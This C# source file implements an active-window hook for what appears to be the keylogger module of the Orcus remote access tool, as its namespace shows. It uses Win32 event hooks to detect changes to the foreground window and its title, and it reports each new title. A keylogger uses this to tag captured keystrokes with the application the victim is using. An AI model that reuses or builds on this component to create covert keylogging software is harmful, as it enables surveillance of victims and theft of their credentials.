using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;
using Orcus.Native;

namespace Orcus.Utilities.KeyLogger
{
    internal class ActiveWindowHook : IDisposable
    {
        // ReSharper disable once PrivateFieldCanBeConvertedToLocalVariable VERY IMPORTANT - else the gb would clean it
        private readonly NativeMethods.WinEventDelegate _hookDelegate;
        private IntPtr _hookHandleTitleChange;
        private IntPtr _hookHandleWinChange;
        private string _lastWindowTitle;

        public ActiveWindowHook()
        {
            _hookDelegate = WinEventProc;
            _hookHandleWinChange = NativeMethods.SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
                IntPtr.Zero,
                _hookDelegate, 0, 0, WINEVENT_OUTOFCONTEXT);
            if (_hookHandleWinChange == IntPtr.Zero)
            {
                //Returns the error code returned by the last unmanaged function called using platform invoke that has the DllImportAttribute.SetLastError flag set. 
                var errorCode = Marshal.GetLastWin32Error();
                //do cleanup

                //Initializes and throws a new instance of the Win32Exception class with the specified error. 
                throw new Win32Exception(errorCode);
            }

            _hookHandleTitleChange = NativeMethods.SetWinEventHook(EVENT_OBJECT_NAMECHANGE, EVENT_OBJECT_NAMECHANGE,
                IntPtr.Zero,
                _hookDelegate, 0, 0, WINEVENT_OUTOFCONTEXT);

            if (_hookHandleTitleChange == IntPtr.Zero)
            {
                //Returns the error code returned by the last unmanaged function called using platform invoke that has the DllImportAttribute.SetLastError flag set. 
                var errorCode = Marshal.GetLastWin32Error();
                //do cleanup

                //Initializes and throws a new instance of the Win32Exception class with the specified error. 
                throw new Win32Exception(errorCode);
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                // Free other state (managed objects).
            }

            if (_hookHandleWinChange != IntPtr.Zero)
            {
                NativeMethods.UnhookWinEvent(_hookHandleWinChange);
                _hookHandleWinChange = IntPtr.Zero;
            }

            if (_hookHandleTitleChange != IntPtr.Zero)
            {
                NativeMethods.UnhookWinEvent(_hookHandleTitleChange);
                _hookHandleTitleChange = IntPtr.Zero;
            }
        }

        ~ActiveWindowHook()
        {
            Dispose(false);
        }

        public event EventHandler<ActiveWindowChangedEventArgs> ActiveWindowChanged;

        public void RaiseOne()
        {
            WinEventProc(IntPtr.Zero, 0, IntPtr.Zero, 0, 0, 0, 0);
        }

        private void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild,
            uint dwEventThread, uint dwmsEventTime)
        {
            if (ActiveWindowChanged != null)
            {
                var title = GetActiveWindowTitle();
                if (!string.IsNullOrEmpty(title) && _lastWindowTitle != title)
                    ActiveWindowChanged(this, new ActiveWindowChangedEventArgs(_lastWindowTitle = title));
            }
        }

        public static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            var buff = new StringBuilder(nChars);
            var handle = NativeMethods.GetForegroundWindow();

            return NativeMethods.GetWindowText(handle, buff, nChars) > 0 ? buff.ToString() : null;
        }

        // ReSharper disable InconsistentNaming
        private const uint WINEVENT_OUTOFCONTEXT = 0;
        private const uint EVENT_SYSTEM_FOREGROUND = 3;

        const uint EVENT_OBJECT_NAMECHANGE = 0x800C;
        // ReSharper restore InconsistentNaming
    }
}